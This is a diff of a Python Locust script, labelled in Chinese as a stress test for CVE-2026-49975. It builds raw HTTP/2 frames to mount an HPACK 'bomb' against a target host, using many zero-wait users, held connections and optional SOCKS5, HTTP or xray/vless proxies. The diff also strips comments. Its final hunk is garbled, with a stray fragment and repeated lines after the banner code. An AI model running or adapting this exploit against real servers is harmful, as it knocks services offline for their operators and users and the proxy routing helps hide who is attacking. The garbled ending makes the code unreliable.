@@ -1,15 +1,6 @@
 #!/usr/bin/env python3
 """
 CVE-2026-49975 专用压测脚本
-============================
-支持代理：
-  - SOCKS5 代理:   SOCKS5_PROXY 环境变量
-  - HTTP 代理:    HTTP_PROXY / HTTPS_PROXY 环境变量
-  - xray/vless:   VLESS_URI + 本地 SOCKS5 代理 (127.0.0.1:10808)
-
-使用 xray 转发 vless://...:
-  1. xray 运行: xray run -config xray_config.json
-  2. 脚本设置: SOCKS5_PROXY=socks5://127.0.0.1:10808
 """
 
 from locust import User, task, constant, events
@@ -23,33 +14,24 @@ import socks
 
 logger = logging.getLogger(__name__)
 
-# ============================================================
-# 环境变量配置
-# ============================================================
-
 REFERENCES = int(os.environ.get("LOCUST_REFERENCES", "2048"))
 HOLD_SECONDS = int(os.environ.get("LOCUST_HOLD_SECONDS", "15"))
 STREAMS = int(os.environ.get("LOCUST_STREAMS", "1"))
 
-# 代理配置（优先级：SOCKS5 > HTTP > HTTPS）
 SOCKS5_PROXY = os.environ.get("SOCKS5_PROXY", "").strip()
 HTTP_PROXY = os.environ.get("HTTP_PROXY", "").strip()
 HTTPS_PROXY = os.environ.get("HTTPS_PROXY", "").strip()
 PROXY_URL = SOCKS5_PROXY or HTTP_PROXY or HTTPS_PROXY or ""
 
 
-def parse_proxy(proxy_url: str):
-    """解析代理 URL"""
+def parse_proxy(proxy_url):
     if not proxy_url:
         return None, None, None
-
     proxy_url = proxy_url.strip()
-
     if "://" not in proxy_url:
         proxy_type = socks.SOCKS5
         host, port = proxy_url.rsplit(":", 1)
         return proxy_type, host.strip(), int(port)
-
     if proxy_url.startswith("socks5://"):
         proxy_type = socks.SOCKS5
         rest = proxy_url[8:]
@@ -65,24 +47,19 @@ def parse_proxy(proxy_url: str):
     else:
         logger.warning(f"未知的代理协议: {proxy_url}")
         return None, None, None
-
     if "@" in rest:
         rest = rest.split("@")[-1]
-
     if ":" in rest:
         host, port_str = rest.split(":", 1)
         port = int(port_str.split("/")[0])
     else:
         host = rest.split("/")[0]
         port = 1080 if proxy_type == socks.SOCKS5 else 8080
-
     return proxy_type, host, port
 
 
 def create_connection(address, timeout=None, proxy_params=None):
-    """建立 TCP 连接（支持 SOCKS5）"""
     proxy_type, proxy_host, proxy_port = proxy_params or (None, None, None)
-
     if proxy_type == socks.SOCKS5:
         sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
         sock.set_proxy(
@@ -114,10 +91,6 @@ def create_connection(address, timeout=None, proxy_params=None):
 
 PROXY_PARAMS = parse_proxy(PROXY_URL)
 
-# ============================================================
-# HTTP/2 帧构建
-# ============================================================
-
 CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
 SETTINGS_FRAME_TYPE = 0x04
 HEADERS_FRAME_TYPE = 0x01
@@ -147,17 +120,11 @@ def build_headers_frame(stream_id, indexed_references=2048):
     return build_frame(HEADERS_FRAME_TYPE, 0x04 | 0x01, stream_id, payload)
 
 
-# ============================================================
-# 用户类
-# ============================================================
-
 class Http2BombUser(User):
     wait_time = constant(0)
-
     references_per_stream = REFERENCES
     streams_per_connection = STREAMS
     hold_seconds = HOLD_SECONDS
-
     _ssl_ctx = None
 
     @classmethod
@@ -181,14 +148,12 @@ class Http2BombUser(User):
         else:
             rest, use_tls = host, True
             default_port = 443
-
         if ":" in rest:
             hostname, port_str = rest.split(":", 1)
             port = int(port_str.split("/")[0])
         else:
             hostname = rest.split("/")[0]
             port = default_port
-
         return hostname, port, use_tls
 
     @task
@@ -237,6 +202,29 @@ class Http2BombUser(User):
             total_time = int((time.time() - start_time) * 1000)
             proxy_name = "xray" if PROXY_URL else "direct"
             request_name = f"/ (refs={self.references_per_stream}, hold={self.hold_seconds}s, via={proxy_name})"
+
+            self.environment.events.request.fire(
+                request_type="H2-BOMB",
+                name=request_name,
+                response_time=total_time,
+                response_length=0,
+                exception=exception,
+                context={},
+            )
+
+
+@events.init.add_listener
+def on_test_start(environment, **kw):
+    proxy_display = PROXY_URL if PROXY_URL else "直连"
+    logger.info("=" * 60)
+    logger.info("  CVE-2026-49975 HTTP/2 HPACK 炸弹压测")
+    logger.info(f"  并发用户数     : {environment.runner.target_user_count}")
+    logger.info(f"  HPACK 引用次数 : {REFERENCES}")
+    logger.info(f"  连接保持秒数   : {HOLD_SECONDS}")
+    logger.info(f"  目标地址       : {environment.host}")
+    logger.info(f"  代理设置       : {proxy_display}")
+    logger.info(f"  测试时长       : {environment.runner.run_time}秒")
+    logger.info("=" * 60)s}s, via={proxy_name})"
 
             self.environment.events.request.fire(
                 request_type="H2-BOMB",
